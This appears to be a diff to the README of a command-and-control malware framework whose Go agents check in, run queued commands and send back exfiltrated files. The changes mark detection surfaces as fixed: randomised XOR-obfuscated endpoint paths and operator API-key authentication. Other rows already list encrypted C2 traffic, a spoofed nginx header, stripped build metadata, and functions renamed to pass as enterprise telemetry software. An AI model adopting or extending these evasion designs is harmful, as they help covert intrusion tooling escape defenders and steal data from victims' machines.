@@ -79,8 +79,8 @@ Tracks every known detection surface, what the fix is, and whether it has been i
 | Payload encryption | All C2 traffic payloads (commands, results) are sent as plaintext JSON, readable by any network tap | ✅ Fixed | AES-256-GCM with a per-build pre-shared key. The server generates a fresh 32-byte key at build time, injects it into the agent binary as a compile-time constant (`EncryptionKey`), and stores it in the `builds` table alongside a non-secret 8-char fingerprint (`key_id`). Every `POST /api/checkin` and `POST /api/result` body uses the `{"kid": "...", "data": "<base64(nonce+ciphertext+tag)>"}` envelope. The GCM authentication tag prevents both tampering and replay of individual messages. |
 | Server response header | `Server: Werkzeug/3.x Python/3.x` response header immediately identifies the C2 server as a Flask application to any analyst inspecting traffic | ✅ Fixed | `@after_request` hook in `app.py` replaces the header with `Server: nginx/1.24.0` on every response, including error pages |
 | Transport security | All traffic is unencrypted HTTP, visible to any man-in-the-middle | 🔴 Open | HTTPS with certificate pinning |
-| Predictable URLs | Endpoint paths (`/api/checkin`, `/api/result`) are hardcoded and easily signatured | 🔴 Open | Randomise API paths at build time via the payload builder |
-| No authentication | Every server endpoint is open, anyone who finds the server can issue commands or download loot | 🔴 Open | API key auth on all endpoints, mutual TLS for agent-to-server trust |
+| Predictable URLs | Endpoint paths (`/api/checkin`, `/api/result`) are hardcoded and easily signatured | ✅ Fixed | The server generates a random 8-character hex slug for each of the four agent-facing endpoints (check-in, result, upload, files) at first launch and stores them in the `server_config` SQLite table. The paths persist across restarts so existing agents stay connected. At build time, all four path strings are fed through the existing XOR obfuscation pipeline and baked into the agent binary — they are never visible as plaintext in the binary, in memory, or on the wire. |
+| No authentication | Every server endpoint is open, anyone who finds the server can issue commands or download loot | ✅ Fixed | A `@before_request` hook in Flask enforces a valid `X-API-Key` header on all `/api/*` requests and returns `401 Unauthorized` if it is absent or incorrect. The key is a 32-character hex string generated at first launch and stored in `server_config`. It is printed to the operator's terminal on startup. Agent-facing endpoints are naturally exempt because they live on randomised hex paths outside the `/api/` namespace. The dashboard prompts for the key on load, stores it in `sessionStorage` (wiped on tab close), and injects it as a header on every outbound API call via a centralised `apiFetch()` wrapper. |
 | Function signatures | Agent functions and variables look suspicious to analysts and scanners | ✅ Fixed | Renamed all internal functions and variables to mimic benign enterprise IT software (e.g., `SyncDeviceState` instead of `checkIn`, `InstallAutoUpdater` instead of `persist`). This helps the agent blend into normal endpoint telemetry noise instead of triggering heuristics. |
 | Strings in binary | Server URLs, API paths, and the persistence service name are all visible in plaintext via `strings` or Ghidra | ✅ Fixed | A random 16-byte XOR key is generated at build time by the payload builder. Every sensitive string (server URL, all API paths, the check-in sentinel, the persistence service label) is XOR-encrypted in Python, hex-encoded, and written directly into the generated `config.go` as a string literal. At runtime `funcs.ResolveConfig()` decodes them into memory on first use. Nothing sensitive appears as a printable string in the binary. |
 | Build metadata / compiler footprint | Go embeds source file paths and the module name in binaries. Without extra flags, running `strings` or loading the binary in Ghidra exposes build paths like `C:\Users\<user>\Desktop\repos\C2-Project\agent\funcs\selfdestruct.go` and the original module name | ✅ Fixed | `-trimpath` strips absolute host build paths from debug info at compile time. `-buildid=` clears the per-build hash. Source files in `funcs/` were renamed to match the telemetry cover (`seal.go`, `sync_backoff.go`, `auto_updater.go`, `cache_purge.go`, `dump_sync.go`) so any residual relative paths look benign. The Go module was renamed from `c2-agent` to `endpoint-telemetry`, which is embedded in every Go binary regardless of strip flags. |
@@ -126,6 +126,17 @@ python app.py
 
 The dashboard is available at `http://localhost:5000`.
 
+On first launch, the server generates a random operator API key and prints it to the terminal:
+
+```
+=======================================
+  Operator API Key (paste into dashboard):
+  a3f7c2e1b9d04a8f6e2c1d5b8a0f3e7c
+=======================================
+```
+
+The key is stored in the SQLite database and reused on every subsequent restart. Paste it into the dashboard auth prompt when you open the UI. All operator-facing API calls require it as an `X-API-Key` header.
+
 ### Build an Agent
 
 From the dashboard, navigate to Deploy and configure:
@@ -143,6 +154,7 @@ Alternatively, build via the API:
 ```bash
 curl -X POST http://localhost:5000/api/build \
   -H "Content-Type: application/json" \
+  -H "X-API-Key: <your-operator-key>" \
   -d '{
     "target_os": "windows",
     "arch": "amd64",
@@ -175,13 +187,15 @@ The `-count=1` flag bypasses Go's test result cache so each run is always fresh.
 
 ## API Reference
 
+All `/api/*` endpoints require the `X-API-Key: <operator-key>` header. Agent-facing endpoints live on randomised hex paths generated at first server launch (e.g. `/a3f7c2e1`) and do not require the API key.
+
 | Method | Endpoint | Description |
 |---|---|---|
 | `GET` | `/` | Operator dashboard |
-| `POST` | `/api/checkin` | Agent check-in and task retrieval |
-| `POST` | `/api/result` | Task result submission |
+| `POST` | `/<random-hex>` | Agent check-in and task retrieval (path randomised per server instance) |
+| `POST` | `/<random-hex>` | Task result submission (path randomised per server instance) |
 | `POST` | `/api/task` | Queue a command for an agent |
-| `POST` | `/api/upload` | Receive exfiltrated file from agent |
+| `POST` | `/<random-hex>` | Receive exfiltrated file from agent (path randomised per server instance) |
 | `POST` | `/api/build` | Compile a new agent binary. Accepts `target_os`, `arch`, `server_url`, `jitter_min` (s), `jitter_max` (s), `persistence`, `profile_id` (1-5), `locale` |
 | `GET` | `/api/agents` | List all registered agents |
 | `GET` | `/api/agents/<id>` | _(not implemented, use DELETE variants)_ |
